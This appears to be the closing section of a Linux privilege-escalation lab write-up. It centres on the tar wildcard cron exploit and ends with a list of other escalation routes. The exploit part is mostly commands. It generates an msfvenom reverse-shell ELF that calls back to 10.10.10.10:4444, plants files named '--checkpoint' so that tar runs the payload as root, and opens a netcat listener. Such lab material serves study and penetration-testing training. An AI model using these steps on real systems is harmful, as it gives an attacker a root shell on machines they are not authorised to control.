## ⏰ Cron Jobs – Tar Wildcard Exploit

### Vulnerability
- Cron job runs `tar` with wildcard `*` in user's home directory.
- Tar can execute commands via `--checkpoint-action`.

### Steps
```bash
# Generate reverse shell payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf

# Transfer to target, make executable
chmod +x /home/user/shell.elf

# Create checkpoint files
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
**Listener:**
```bash
nc -nvlp 4444
```
**Cleanup:**
```bash
rm /home/user/shell.elf /home/user/--checkpoint=1 /home/user/--checkpoint-action=exec=shell.elf
```

## 🔑 Key Takeaways
- **MySQL UDF** – services running as root can be exploited via UDFs.
- **Sudo environment** – `LD_PRELOAD` and `LD_LIBRARY_PATH` can lead to privilege escalation.
- **Cron jobs** – writable scripts or PATH manipulation can yield root shells.
- **SUID binaries** – check GTFOBins for known exploits and injection techniques.
- **Password hashes** – world-readable `/etc/shadow` or writable `/etc/passwd` can be cracked/modified.
- **Config files & history** – often contain cleartext passwords.
- **NFS** – `no_root_squash` allows SUID binaries to run as root.
- **Kernel exploits** – last resort; Dirty COW is a classic.
